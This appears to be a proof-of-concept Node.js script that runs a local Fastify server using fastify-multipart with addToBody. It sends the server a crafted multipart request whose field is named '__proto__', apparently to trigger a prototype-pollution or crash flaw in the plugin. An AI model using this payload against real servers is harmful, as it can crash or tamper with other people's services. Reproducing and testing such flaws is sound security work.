const http = require("http");
const fastify = require("fastify")();
const options = {
  addToBody: true,
  onFile: (fieldName, stream, filename, encoding, mimetype, body) => {
    stream.resume();
  },
};
fastify.register(require("fastify-multipart"), options);
fastify.post("/", function (req, reply) {
  console.log(req.body.toString());
  reply.code(200).send();
});
fastify.listen(3000, () => {
  console.log(`server listening on ${fastify.server.address().port}`);
  const body =
    "--AaB03x\r\n" +
    'content-disposition: form-data; name="__proto__"; filename="file1.txt"\r\n' +
    "Content-Type: text/plain\r\n" +
    "\r\n" +
    "... contents of file1.txt ...\r\r\n" +
    "--AaB03x--\r\n";
  const r = {
    hostname: "localhost",
    port: 3000,
    path: "/",
    method: "POST",
    headers: {
      "content-type": "multipart/form-data; boundary=AaB03x",
    },
  };
  const req = http.request(r, (res) => {});
  req.write(body);
  req.end();
});
